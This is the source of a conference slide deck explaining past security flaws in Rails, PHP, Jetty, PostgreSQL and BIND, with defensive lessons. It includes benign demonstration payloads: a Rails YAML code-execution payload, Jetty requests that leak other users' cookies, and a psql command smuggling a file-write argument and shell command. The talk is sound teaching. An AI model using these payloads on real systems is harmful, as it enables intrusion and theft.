doctype html
html
  head
    meta(charset='utf-8')
    meta(name='viewport', content='width=device-width, initial-scale=1, maximum-scale=1')
    title Your Web Stack Would Betray You In An Instant

    // build:css styles/styles.css
    //- Check out 'src/bower_components/prism/themes/' for available themes
    link(rel='stylesheet', type='text/css', href='bower_components/prism/themes/prism-tomorrow.css')
    link(rel='stylesheet', type='text/css', href='styles/defaults.css')
    link(rel='stylesheet', type='text/css', href='styles/main.css')
    // endbuild

  body

    article

      section(data-bespoke-state='topic-slide')
        h1.title Your Web Stack Would Betray You In An Instant
        address.vcard
          div.author.fn Tim Perry
          div.urls
            span 
              a.nickname.url(href='http://twitter.com/pimterry',rel="me") @pimterry
          div.note.bio
            span Tech Lead &amp; Open-Source Champion at&nbsp;
            span.org.vcard
              a.org.fn.url(href='http://softwire.com',rel="group") Softw<span class="i">i</span>re

      section
        img(src='images/softwireLogo.png',class='logo-big',alt='Softwire')
        aside
          ul
            li Bespoke software development company
            li in London
            li We're recruiting!
            li Interesting problems, great atmosphere, huge variety of different tools and projects

      section
        h2.full-slide Security
        aside
          ul
            li When I say security, I mean handling nasty people on the internet trying to mess with your web app
            li Often assumed you're not worth attacking
            li Opportunistic attackers, looking for easy security holes
            li Platform for virus and malware distribution, phishing, for further attacks elsewhere.
            li We're going to look at some examples

      section
        h2 Your Web Application:

        ul.stack
          li Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Infrastructure

        aside
          ul
            li This is you
            li Walk through each
            li Broad concepts
            li Bit of a spoiler

      section
        h2 Everything is insecure
        
        aside
          ul
            li Whole point of the talk
            li Security is hard
            li You're not going to do it perfectly
            li Inevitable failure means that it's more about minimizing risk + potential damage
            li Upside to this

      section
        h2 Things that will be loudly publically insecure:

        ul.stack
          li.lowlight Your Code
          li Web Framework
          li Programming Language
          li Web Server
          li Database
          li Network Infrastructure        

        aside
          ul
            li If your code is insecure, nobody cares
            li There's probably very few people looking

            li Lots of value in holes in common components
            li This talk is not about your code, about shared code you're using

            li I want to talk about some of these, how they work
            li because I enjoy taunting software devs
            li also what you can do to avoid this
            li Before we do that though

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Be Ready  
          | To Update
        aside
          ul
            li Number one point in this whole talk
            li Obvious conclusion: if everything will break, you have to be ready to recover
            li Most projects announce vulnerabilities as soon as they have a release to fix them
            li All you really have to do is react faster than the other team
            li If you do nothing else: subscribe to notifications
            li Make sure you're in a good position to do something about them

      section(data-bespoke-state='topic-slide')
        h2.full-slide Ruby on Rails

        ul.stack.corner
          li.lowlight Your Code
          li Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure

        aside
          ul
            li Start with rails
            li Popular web framework
            li Easy to quickly build applications
            li Automatically handles lot of complexity for you
            li On top of Ruby the language

      section
        h2 YAML

        ul.bullets.in-place-transition
          li
            pre
              code.language-yaml.
                ---
                name: "Tim Perry"
                company: "Softwire"
                speaking: Yes
                ears:
                 - "Left"
                 - "Right"
          li
            pre
              code.language-yaml.
                --- !ruby/hash:User
                name: "Tim Perry"
                company: "Softwire"
                speaking: Yes
                ears:
                 - "Left"
                 - "Right"
        aside
          ul
            li Very popular in the Ruby world
            li Config, serialization
            li *Mostly compatible* with JSON
            li *Optional braces*
            li Supports lots of extra complexity
            li One thing it supports is types
            li User, as a hash/dict/map
            li Default Ruby YAML parser will build a User when this is parsed
            li Dangerous if building, say, database connections, just by parsing

      section
        h2 YAML
        pre
          code.language-ruby.
            user = User.allocate
            values.each_pair { |key,val|
                user[key] = val
            }
        aside
          ul
            li Allocate is not constructor
            li Set key-values for each prop, name/company etc
            li Weird: parsing process actively involved in your code
            li Not just weird: because you can override property setting
            li Key, Value and class are user controlled 
            li Dangerous: if key/value's ever used for anything...

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            alias []= add

            def add(name, route)
              ...
              @module.module_eval(
                "remove_possible_method :\#{name}; ..."
              )
              ...
            end
        aside
          ul
            li Builtin Rails class, part of routing
            li Overrides property setting operation
            li \#{name} is string replacement syntax in Ruby
            li Classic eval-injection attack

      section
        h2 NamedRouteCollection
        pre
          code.language-ruby.
            name = "ignored; puts 'Hello'; \n__END__\n"            

            @module.module_eval(
              "remove_possible_method :\#{name}; ..."
            )

            # Becomes:

            @module.module_eval(
              "remove_possible_method :ignored; puts 'Hello'; 
               __END__
               ..."
            )
        aside
          ul 
            li This runs 'puts hello'
            li puts = print
            li Works because __END__ exists
            li Terminates a chunk of code prematurely
            
      section
        h2 Arbitrary Code Execution with YAML
        pre
          code.language-yaml.
            --- !ruby/hash:NamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n": 
                !ruby/object:OpenStruct 
                  ‘table’: {‘defaults’: {}}
        p (Namespaces omitted)
        aside
          ul
            li YAML equivelant
            li Need openstruct for validation
            li If Rails parses this, you win
            li But somehow you need to get Rails to parse this
            li Early last year, that got really easy

      section
        h2 Rails
        h4 CVE-2013-0156
        pre
          code.language-yaml.
            &lt;?xml version="1.0"?&gt;
            &lt;foo type='yaml'&gt;
              --- !ruby/hash:NamedRouteCollection
              "ignored; puts 'Hello'; \n__END__\n":
                  !ruby/object:OpenStruct
                    'table': {'defaults': {}}
            &lt;/foo&gt;
        aside
          ul
            li Rails has a lot of convenient features
            li Default: Endpoints can take data in JSON or XML
            li XML elements can be typed, as here
            li YAML is a valid type, for some ungodly reason
      section
        h2 Rails
        h4 CVE-2013-0333
        pre
          code.language-yaml.
            Content-Type: application/json

            --- !ruby/hash\u003aNamedRouteCollection
            "ignored; puts 'Hello'; \n__END__\n":
                !ruby/object\u003aOpenStruct
                  'table': {'defaults': {}}
        aside
          ul
            li Two weeks later, another one
            li Default JSON parser is really just YAML
            li Intended to use YAML internally
            li But actually doesn't parse JSON and restructure
            li Couple of search and replaces and hopes for the best
            li No consideration of security at all
            li Replaces date strings with YAML date literals for convenience            
            li Adds a space after colons, because that's required in YAML
            li Then does unicode replacement too, afterwards

      section
        h2 Rails
        h4 CVE-2013-0277
        pre
          code.language-ruby.
            class BlogPost &lt; ActiveRecord::Base
              :serialize tags
            end
    
      section
        h2.full-slide Ouch

        aside
          ul
            li Pretty painful for Rails developers
            li 3 times in two months
            li Repeated nights of no sleep redeploying everything before they got hacked
            li All that work was not for nothing though
            li I for example got a great example out of it
            li And you get some useful lessons

      section(data-bespoke-state='solution-slide')
        h2.full-slide Fear User Input
        h3 (in any format)
        aside
          ul
            li Limit what input you accept
            li Tools will may assume their input is safe
            li Powerful formats: both YAML and XML, but JSON mostly safe

      section(data-bespoke-state='topic-slide')
        h2.full-slide PHP 

        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure

      section
        h2 PHP
        pre
          code.language-php.
            $user = new User();
            $user-&gt;username = $_POST['username'];

            $hashedPassword = crypt($_POST['password'], $salt);
            $user-&gt;password = $hashedPassword;

            $user-&gt;save();
        p (Salt generation and all validation omitted)
        aside
          ul
            li Validation!
            li Salt is unique per user
            li But same salt for every login

      section
        h2 PHP
        pre
          code.language-php.
            $salt = $user-&gt;password;
            $hashedPasswordInput = crypt($_POST['password'], $salt);

            $loginOk = ($user-&gt;password === $hashedPasswordInput);
        aside
          ul
            li Convenient feature though: salt is included in password
            li This is the recommended way of handling this
            li Separated by a $
      section
        h2 PHP 5.3.7
        pre(style='font-size: 24px')
          code.language-c.

          span(style='color: #f77')
            code.language-c.
            | - strncat(passwd, "$", 1);

          br
          span(style='color: #7f7')
            code.language-c.
            | + strlcat(passwd, "$", 1);
        aside
          ul
            li Well meaning fix to solve build warning
            li Strncat is considered insecure because it might overflow first arg
            li Strlcat doesn't do this, so is better
            li Unfortunately, doesn't do this because of the last arg
            li Fixed another important security issue
            li Recommended for immediate update for 5 days

      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        pre
          code.language-php.
            crypt($password, $salt) === $salt
      section
        h2 PHP 5.3.7
        h4 CVE-2011-3189
        ul.bullets.in-place-transition
          li
            pre
              code.language-php.
                $salt = $user-&gt;password;
                $hashedPasswordInput = crypt($_POST['password'], $salt);

                $loginOk = ($user-&gt;password === $hashedPasswordInput);
          li
            pre
              code.language-php.
                $salt = $user-&gt;password;
                $hashedPasswordInput = $salt;

                $loginOk = ($user-&gt;password === $hashedPasswordInput);
          li
            pre
              code.language-php.
                $loginOk = ($user-&gt;password === $user-&gt;password);
      section
        h2 Tests?
      section
        h2 Reported?

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Value
          br 
          | Best
          br
          | Practices

      section(data-bespoke-state='topic-slide')
        h2.full-slide Jetty
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li Web Server
          li.lowlight Database
          li.lowlight Network Infrastructure
        aside
          ul
            li We're all using a web server, Apache, Tomcat, Jetty, IIS
            li Jetty particularly is growing rapidly in the modern Java community            
            li Like Nancy in the C# world

      section
        h2 HTTP
        pre
          code.language-bash.
            GET / HTTP/1.1
            Host: localhost:8080
            Accept: text/html
            Cookie: password=secret

        aside
          ul
            li This is a simple HTTP request Jetty might receive
            li Has a series of headers with keys and values
            li Some of which contain secrets, typically the cookies particularly
            li Potentially also the request body too though, containing valuables

      section
        h2 Bad HTTP
        pre
          code.language-bash.
            GET / HTTP/1.1
            Host: localhost:8080
            Accept&#174;: text/html

        aside
          ul
            li This is an invalid HTTP request
            li &169; is binary 169, and that's not a legal character in an HTTP header name
            li Jetty follows the RFCs for this and (like most web servers) rejects this request.

      section
        h2 Bad HTTP
        pre
          code.language-bash.
            HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
               'GET / HTTP/1.1
                H...t:8080
                Accept\xC2<<<\xAe: text/html

                >>>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
                \x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00
                \x00\x00\x00\x00\x00\x00\x00\x00'
            Content-Length: 0
            Connection: close
            Server: Jetty(9.2.8.v20150217)
        aside
          ul
            li In that case, with the version of Jetty released in February, we get a response like this.
            li Error message containing the request content and highlighting the bad character
            li There's an issue with this though
            li What're those zeros?
            li They're the rest of the contents of the buffer
            li This is printed by a general purpose 'toDebugString(buffer)' method
            li Prints the content in a buffer, highlighting a part, and providing context
            li This sounds fine, just messy, but is actually a huge disaster: these buffers are reused by all requests
            li If the previous request was longer than this one, we can read a chunk of data out of it
            li Can change which data by progressively increasing how far down our request the bad character comes



      section
        h4 CVE-2015-2080
        ul.bullets.in-place-transition
          li
            div.sideBySide
              pre(style='align-self: flex-start;')
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept: text/html
                  Cookie: password=secret
              pre
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept®: text/html


                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
                   'GET / HTTP/1.1
                    H...t:8080
                    Accept\xC2<<<\xAe: text/html

                    >>>ie: password=secr...\x00\x00\x00\x00\x00
                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                  Content-Length: 0
                  Connection: close
                  Server: Jetty(9.2.8.v20150217)



          li
            div.sideBySide
              pre(style='align-self: flex-start;')
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept: text/html
                  Cookie: password=secret
              pre
                code.language-bash.
                  GET / HTTP/1.1
                  Host: localhost:8080
                  Accept®: text/htmlQQQQ


                  HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
                   'GET / HTTP/1.1
                    H...t:8080
                    Accept\xC2<<<\xAe: text/htmlQQQQ

                    >>>password=secret

                    ...\x00\x00\x00\x00\x00
                    \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                  Content-Length: 0
                  Connection: close
                  Server: Jetty(9.2.8.v20150217)
        aside
          ul
            li We can use this to see bits of other people's requests          
            li And with minor fiddling, we can find the relevant bit of request we're looking for
            li Live for 6 months, from September last year until the end of February

      section
        h2 Fixed        
        pre
          code.language-bash.
            HTTP/1.1 400 Illegal character 0xc2
            Content-Length: 0
            Connection: close
            Server: Jetty(9.2.9.v20150224)

      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Keep
          br
          | Errors
          br
          | Secret

      section(data-bespoke-state='topic-slide')
        h2.full-slide PostgreSQL
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li Database
          li.lowlight Network Infrastructure
      
      section
        h2 Postgres
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="blogdb"
        aside
          ul
            li Postgres client
            li Most absurd bug of the lot
            li DB name with a dash, it's not a DB name, but command line arg, on the server.
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/data/db"
        aside
          ul
            li This writes the command output to this file, corrupting the DB
            li This happens before auth
            li Actually even before connection filtering
            li Crash any connectable Postgres instance
            li September 2010 to April 2013
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            no pg_hba.conf entry for host "example.com", 
              user "postgres", database "-r/var/lib/postgres/data/db"
        aside
          ul
            li Log out put looks like this
            li username is notably under our control
            li Find somewhere executable to put this
            li Classic injection attack
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            psql --host="example.com" \
                 --dbname="-r/var/lib/postgres/.profile" \
                 --username="
                 echo 'Hello' #"
        aside
          ul
            li .Profile is a favourite for this, since it's very liberal about what it'll run
            li it'll ignore our garbage, just need a line that's usefully executable
            li it's run whenever a user logs in, here the postgres user
            li Here newline, then our command, then a comment to clear the rest
      section
        h2 Postgres
        h4 CVE-2013-1899
        pre
          code.language-bash.
            $ cat .profile
            [...]
            no pg_hba.conf entry for host "example.com", user "
            echo 'Hello' #", database "-r/var/lib/postgres/.profile"

        pre
          code.language-bash.
            $ su - postgres
            no: command not found
            Hello
        aside

      section
        h2 So?
        aside
          ul
            li 450000 connectable postgres's on the default port
            li Sometimes for convenience, relying on postgres' own security
            li Sometimes for distributed infrastructure
            li All in hilarious danger
          
      section(data-bespoke-state='solution-slide')
        h2.fullish-slide Isolate Your Components
        h3 (From itself, and everyone else)
        aside
          ul
            li Isolation is important
            li Isolate your tools from the world, to reduce attack surface
            li Combine their security, so both must fail
            li Isolate your components from one another 
            li Otherwise you're combining their risks: failure if either fails
            li Don't rely on one single point of failure for security

      section(data-bespoke-state='topic-slide')
        h2.full-slide BIND
        ul.stack.corner
          li.lowlight Your Code
          li.lowlight Web Framework
          li.lowlight Programming Language
          li.lowlight Web Server
          li.lowlight Database
          li Network Infrastructure
        aside
          ul
            li Who thinks they know how DNS works?
            li Berkley Internet Name Daemon
            li 85% market share
            li Almost every page you open probably involved a request to BIND at some stage
            li Similarly, every user that you have probably uses BIND to find you
            li It's generally not a good idea to run your own nameservers
            li But that doesn't mean they're not a part of your system
            li Can be made vulnerable by their failures: phishing
            li Nobody looks at certs

      section
        h2 TSIG
        h4 RFC 2845
        aside
          ul
            li For a long time DNS was essentially unsecured
            li DNS cache poisoning and MitM generally a big problem, DNSSEC/DNSCurve
            li Fundamentally a distributed database
            li Needs secure methods for internal replication of transactions too
            li Has to be more lightweight than full public/private key auth process, for when that's useful (2000 originally)
            li TSIG is that: signing requests for zone transfers and dynamic DNS updates
            li Secondary DNS servers updating their caches for their zone
            li Full zone transfer includes all domains
            li Potentially gives away details about internal infrastructure
            li Also useful for machines that move around a lot, but want a DNS name anyway
            li Symmetric shared keys used
            li Need to distribute keys. Typically done out-of-band.
            li One of many ways to do this sort of thing, DNS is complicated
            li TSIG is not really the go-to solution for this now: DNSSEC and similar, lots of competition

      section
        h2 TKEY
        h4 RFC 2930
        aside
          ul
            li If you do want to do TSIG, sharing keys is a bit of hassle
            li TKEY is a DNS record type, like an A record or a CNAME
            li A TKEY record contains some key data, and a bunch of metadata
            li Obviously this can't just be a server giving out it's secret keys
            li Lots of modes. Can verify requests in various ways, can provide GSSAPI and all sorts
            li Often used with diffie-hellman setup, so there's no public information
            li Diffie Hellman used for agreeing on a shared secret between two servers without any preceeding information, or ever exposing the keys over the wire
            li Bit like magic, well worth a read
            li But essentially, this is key distribution infrastructure for a corner case of a minor feature nobody uses.

      section
        pre(style='font-size: 55%; width: 100%; margin: 0')
          code.language-c.
            dns_tkey_processquery(dns_message_t *msg, dns_tkeyctx_t *tctx, dns_tsig_keyring_t *ring) {
              isc_result_t result = ISC_R_SUCCESS;
              dns_rdata_tkey_t tkeyin, tkeyout;
              isc_boolean_t freetkeyin = ISC_FALSE;
              dns_name_t *qname, *name, *keyname, *signer, tsigner;
              dns_fixedname_t fkeyname;
              dns_rdataset_t *tkeyset;
              dns_rdata_t rdata;
              dns_namelist_t namelist;
              char tkeyoutdata[512];
              isc_buffer_t tkeyoutbuf;

              REQUIRE(msg != NULL);
              REQUIRE(tctx != NULL);
              REQUIRE(ring != NULL);

              ISC_LIST_INIT(namelist);

              /*
               * Interpret the question section.
               */
              result = dns_message_firstname(msg, DNS_SECTION_QUESTION);
              if (result != ISC_R_SUCCESS) return (DNS_R_FORMERR);

              qname = NULL;
              dns_message_currentname(msg, DNS_SECTION_QUESTION, &qname);

              /*
               * Look for a TKEY record that matches the question.
               */
              tkeyset = NULL;
              name = NULL;
              result = dns_message_findname(msg, DNS_SECTION_ADDITIONAL, qname,
                                            dns_rdatatype_tkey, 0, &name, &tkeyset);
              if (result != ISC_R_SUCCESS) {
                  /*
                   * Try the answer section, since that's where Win2000
                   * puts it.
                   */
                  if (dns_message_findname(msg, DNS_SECTION_ANSWER, qname
                                           dns_rdatatype_tkey, 0, &name,
                                           &amp;tkeyset) != ISC_R_SUCCESS) { 
                      &nbsp;&nbsp;&nbsp;&nbsp;result = DNS_R_FORMERR;
                      tkey_log("dns_tkey_processquery: couldn't find a TKEY "
                               "matching the question");
                      goto failure;
                  }
              }
              result = dns_rdataset_first(tkeyset);
              if (result != ISC_R_SUCCESS) {
                  result = DNS_R_FORMERR;
                  goto failure;
              }
              dns_rdata_init(&rdata);
              dns_rdataset_current(tkeyset, &rdata);
      
              RETERR(dns_rdata_tostruct(&rdata, &tkeyin, NULL));
              freetkeyin = ISC_TRUE;
      
              if (tkeyin.error != dns_rcode_noerror) {
                  result = DNS_R_FORMERR;
                  goto failure;
              }
      
              /*
               * Before we go any farther, verify that the message was signed.
               * GSSAPI TKEY doesn't require a signature, the rest do.
               */
              dns_name_init(&tsigner, NULL);
              result = dns_message_signer(msg, &tsigner);
              if (result != ISC_R_SUCCESS) {
                  if (tkeyin.mode == DNS_TKEYMODE_GSSAPI &&
                      result == ISC_R_NOTFOUND)
                          signer = NULL;
                  else {
                      tkey_log("dns_tkey_processquery: query was not "
                               "properly signed - rejecting");
                      result = DNS_R_FORMERR;
                      goto failure;
                  }
              } else
                  signer = &tsigner;
      
              tkeyout.common.rdclass = tkeyin.common.rdclass;
              tkeyout.common.rdtype = tkeyin.common.rdtype;
              ISC_LINK_INIT(&tkeyout.common, link);
              tkeyout.mctx = msg->mctx;
      
              dns_name_init(&tkeyout.algorithm, NULL);
              dns_name_clone(&tkeyin.algorithm, &tkeyout.algorithm);
      
              tkeyout.inception = tkeyout.expire = 0;
              tkeyout.mode = tkeyin.mode;
              tkeyout.error = 0;
              tkeyout.keylen = tkeyout.otherlen = 0;
              tkeyout.key = tkeyout.other = NULL;
      
              /*
               * A delete operation must have a fully specified key name.  If this
               * is not a delete, we do the following:
               * if (qname != ".")
               *      keyname = qname + defaultdomain
               * else
               *      keyname = <random hex> + defaultdomain
               */
              if (tkeyin.mode != DNS_TKEYMODE_DELETE) {
                  dns_tsigkey_t *tsigkey = NULL;
      
                  if (tctx->domain == NULL && tkeyin.mode != DNS_TKEYMODE_GSSAPI) {
                      tkey_log("dns_tkey_processquery: tkey-domain not set");
                      result = DNS_R_REFUSED;
                      goto failure;
                  }
      
                  dns_fixedname_init(&fkeyname);
                  keyname = dns_fixedname_name(&fkeyname);
      
                  if (!dns_name_equal(qname, dns_rootname)) {
                      unsigned int n = dns_name_countlabels(qname);
                      RUNTIME_CHECK(dns_name_copy(qname, keyname, NULL)
                                    == ISC_R_SUCCESS);
                      dns_name_getlabelsequence(keyname, 0, n - 1, keyname);
                  } else {
                      static char hexdigits[16] = {
                          '0', '1', '2', '3', '4', '5', '6', '7',
                          '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' };
                      unsigned char randomdata[16];
                      char randomtext[32];
                      isc_buffer_t b;
                      unsigned int i, j;
  
                      result = isc_entropy_getdata(tctx->ectx,
                                                   randomdata,
                                                   sizeof(randomdata),
                                                   NULL, 0);
                      if (result != ISC_R_SUCCESS)
                          goto failure;
  
                      for (i = 0, j = 0; i < sizeof(randomdata); i++) {
                           unsigned char val = randomdata[i];
                           randomtext[j++] = hexdigits[val >> 4];
                           randomtext[j++] = hexdigits[val & 0xF];
                      }
                      isc_buffer_init(&b, randomtext, sizeof(randomtext));
                      isc_buffer_add(&b, sizeof(randomtext));
                      result = dns_name_fromtext(keyname, &b, NULL, 0, NULL);
                      if (result != ISC_R_SUCCESS)
                          goto failure;
                  }
      
                  if (tkeyin.mode == DNS_TKEYMODE_GSSAPI) {
                      /* Yup.  This is a hack */
                      result = dns_name_concatenate(keyname, dns_rootname,
                                                    keyname, NULL);
                      if (result != ISC_R_SUCCESS)
                          goto failure;
                  } else {
                      result = dns_name_concatenate(keyname, tctx->domain,
                                                    keyname, NULL);
                      if (result != ISC_R_SUCCESS)
                          goto failure;
                  }
  
                  result = dns_tsigkey_find(&tsigkey, keyname, NULL, ring);
  
                  if (result == ISC_R_SUCCESS) {
                      tkeyout.error = dns_tsigerror_badname;
                      dns_tsigkey_detach(&tsigkey);
                          goto failure_with_tkey;
                  } else if (result != ISC_R_NOTFOUND)
                          goto failure;
              } else
                  keyname = qname;
      
              switch (tkeyin.mode) {
                  case DNS_TKEYMODE_DIFFIEHELLMAN:
                      tkeyout.error = dns_rcode_noerror;
                      RETERR(process_dhtkey(msg, signer, keyname, &tkeyin,
                                            tctx, &tkeyout, ring,
                                            &namelist));
                      break;
                  case DNS_TKEYMODE_GSSAPI:
                      tkeyout.error = dns_rcode_noerror;
                      RETERR(process_gsstkey(keyname, &tkeyin, tctx,
                                             &tkeyout, ring));
                      break;
                  case DNS_TKEYMODE_DELETE:
                      tkeyout.error = dns_rcode_noerror;
                      RETERR(process_deletetkey(signer, keyname, &tkeyin,
                                                &tkeyout, ring));
                      break;
                  case DNS_TKEYMODE_SERVERASSIGNED:
                  case DNS_TKEYMODE_RESOLVERASSIGNED:
                      result = DNS_R_NOTIMP;
                      goto failure;
                  default:
                      tkeyout.error = dns_tsigerror_badmode;
              }
      
              failure_with_tkey:
                  dns_rdata_init(&rdata);
                  isc_buffer_init(&tkeyoutbuf, tkeyoutdata, sizeof(tkeyoutdata));
                  result = dns_rdata_fromstruct(&rdata, tkeyout.common.rdclass,
                                                tkeyout.common.rdtype, &tkeyout,
                                                &tkeyoutbuf);
          
                  if (freetkeyin) {
                      dns_rdata_freestruct(&tkeyin);
                      freetkeyin = ISC_FALSE;
                  }
          
                  if (tkeyout.key != NULL)
                      isc_mem_put(tkeyout.mctx, tkeyout.key, tkeyout.keylen);
                  if (tkeyout.other != NULL)
                      isc_mem_put(tkeyout.mctx, tkeyout.other, tkeyout.otherlen);
                  if (result != ISC_R_SUCCESS)
                      goto failure;
          
                  RETERR(add_rdata_to_list(msg, keyname, &rdata, 0, &namelist));
          
                  RETERR(dns_message_reply(msg, ISC_TRUE));
          
                  name = ISC_LIST_HEAD(namelist);
                  while (name != NULL) {
                      dns_name_t *next = ISC_LIST_NEXT(name, link);
                      ISC_LIST_UNLINK(namelist, name, link);
                      dns_message_addname(msg, name, DNS_SECTION_ANSWER);
                      name = next;
                  }
          
                  return (ISC_R_SUCCESS);
          
              failure:
                  if (freetkeyin)
                      dns_rdata_freestruct(&tkeyin);
                  if (!ISC_LIST_EMPTY(namelist))
                      free_namelist(msg, &namelist);
                  return (result);
            }
        aside
          ul
            li This is the TKEY query processing implementation
            li Takes a request for a key, tries to find the key, sends a response back with it, if you're allowed it
            li It's quite complicated. It's also broken
            li How would you start trying to audit this? Any idea where the catastrophic bug is?

      section
        pre(style='font-size: 80%; width: 100%; margin: 0')
          code.language-c.
            /*
             * Look for a TKEY record that matches the question.
             */
            tkeyset = NULL;
            name = NULL;
            result = dns_message_findname(msg, DNS_SECTION_ADDITIONAL, qname,
                                          dns_rdatatype_tkey, 0, &name, &tkeyset);
            if (result != ISC_R_SUCCESS) {
                /*
                 * Try the answer section, since that's where Win2000
                 * puts it.
                 */
                if (dns_message_findname(msg, DNS_SECTION_ANSWER, qname
                                         dns_rdatatype_tkey, 0, &name,
                                         &amp;tkeyset) != ISC_R_SUCCESS) { 
                    &nbsp;&nbsp;&nbsp;&nbsp;result = DNS_R_FORMERR;
                    tkey_log("dns_tkey_processquery: couldn't find a TKEY "
                             "matching the question");
                    goto failure;
                }
            }
        aside
          ul
            li Let's make it easier. It's in this bit, where we go find the record
            li Any idea?
            li Here we've got a request for a TKEY record with a certain name
            li We look in the ADDITIONAL section for record names, and search for those in all our TKEY data
            li If that fails, we look in the ANSWER section of the requestm because that's what Win2000 incorrectly does


      section
        pre(style='font-size: 80%; width: 100%; margin: 0')
          code.language-c.
            dns_message_findname(dns_message_t *msg, dns_section_t section,
                                 dns_name_t *target, dns_rdatatype_t type,
                                 dns_rdatatype_t covers, dns_name_t **name,
                                 dns_rdataset_t **rdataset)
            {
              dns_name_t *foundname;
              isc_result_t result;
      
              /*
               * XXX These requirements are probably too intensive, especially
               * where things can be NULL, but as they are they ensure that if
               * something is NON-NULL, indicating that the caller expects it
               * to be filled in, that we can in fact fill it in.
               */
              REQUIRE(msg != NULL);
              REQUIRE(VALID_SECTION(section));
              REQUIRE(target != NULL);
              if (name != NULL) REQUIRE(*name == NULL);
              if (type == dns_rdatatype_any) {
                REQUIRE(rdataset == NULL);
              } else {
                if (rdataset != NULL) REQUIRE(*rdataset == NULL);
              }
      
              result = findname(&foundname, target,
                                &msg->sections[section]);
      
              if (result == ISC_R_NOTFOUND)
                return (DNS_R_NXDOMAIN);
              else if (result != ISC_R_SUCCESS)
                return (result);
      
              if (name != NULL)
                *name = foundname;
      
              /*
               * And now look for the type.
               */
              if (type == dns_rdatatype_any)
                return (ISC_R_SUCCESS);
      
              result = dns_message_findtype(foundname, type, covers, rdataset);
              if (result == ISC_R_NOTFOUND)
                return (DNS_R_NXRRSET);
      
              return (result);
            }
        aside
      
      section(data-bespoke-state='solution-slide')
        h2.full-slide
          | Avoid
          br
          | Complexity
        aside
          ul
            li This is all really complicated
            li You think it's hard to follow, imagine trying to explain it
            li DNS is a complicated system
            li BIND tries to support all of it in every case all the time though
            li 137 RFCs listed on their site, as their 'spec'. Plus workarounds, patches, their own features, etc
            li TSIG and TKEY are not important features in many cases.
            li Support for Windows 2000 sending you updates even less so (~0.01% market share, end of life 5 years ago)
            li Complexity makes things like this hard to remove
            li Should all definitely be disablable, probably external plugins
            li 
            li Generally smacks of control plane/data plane confusion
            li Cloudflare DNS proxy solves, interestingly: doesn't allow updates.
            li Why on earth would you tie updates to the core structure of the internet directly to the most basic lookup operation of the entire internet?
            li 
            li Found by fuzzer by security researcher
            li Could've been absolutely catastophic
            li 
            li Prefer systems that are implemented and structured simply internally
            li Aim for that too, whether you're building your own or major tool code
            li Prefer systems that do what you need, and no more
            li Less is more

      section(data-bespoke-state='topic-slide') 
        h2 The also-rans:

        ul
          li <span class='highlight'>Node.JS</span>: Cross-request header stealing <br/>(CVE-2012-2330)
          li <span class='highlight'>Python</span>: Remote code execution via builtin socket receive function <br/>(CVE-2014-1912)
          li <span class='highlight'>GCC</span>: Optimizations remove checks required to avoid overflow exploits<br/>(CVE-2009-1897)
          li <span class='highlight'>WebSockets</span>: Security bug in initial spec, when used with caching proxies
          li <span class='highlight'>SSL/TLS</span>: BEAST/CRIME/BREACH attacks against SSL and TLS<br/>(CVE-2011-3389, CVE-2012-4929, CVE-2013-3587)
          li <span class='highlight'>MongoDB</span>: Overflow exploits, crashing servers with a single request <br/>(CVE-2012-6619, CVE-2013-2132)
          li <span class='highlight'>RubyGems</span>: YAML exploit gave an external user full access to the repo
          li <span class='highlight'>NPM</span>: Full disk exposure on NPM server with a maliciously crafted URL
        aside
          ul
            li There's a lot of these, not hard finding options to talk about.
            li 4,500 so far in 2015, 711 9+ out of 10.
            li 9+ generally means terrible consequences, easy to attack, widely relevant, not a special case

      section(data-bespoke-state='topic-slide')
        h4 Nothing is really secure, but
        h2.full-slide Don't Panic
        h3.conclusions
          ul
            li Be ready to update
            li Fear user input
            li Value best practices
            li Keep errors secret
            li Isolate your components
            li Avoid complexity
        aside
          ul
            li If nothing else, watch for security notices, be ready to update <em>fast</em>
            li Be very cautious around user input. Lots of risk that's easily missed.
            li Pay attention to software development best practices, especially testing etc
            li Consider the real cost of features. Turn off or limit unnecessary features where possible
            li Isolate your components from one another, and the world

      section(data-bespoke-state='topic-slide') 
        h1.title Your Web Stack Would Betray You In An Instant

        address.vcard
          div.author.fn Tim Perry
          div.urls
            span 
              a.nickname.url(href='http://twitter.com/pimterry',rel="me") @pimterry
          div.note.bio
            span Tech Lead &amp; Open-Source Champion at&nbsp;
            span.org.vcard
              a.org.fn.url(href='http://softwire.com',rel="group") Softw<span class="i">i</span>re
        aside
          ul
            li We're recruiting!
            li Follow me on twitter for slides

    // build:js scripts/scripts.js
    script(src='bower_components/bespoke.js/dist/bespoke.js')
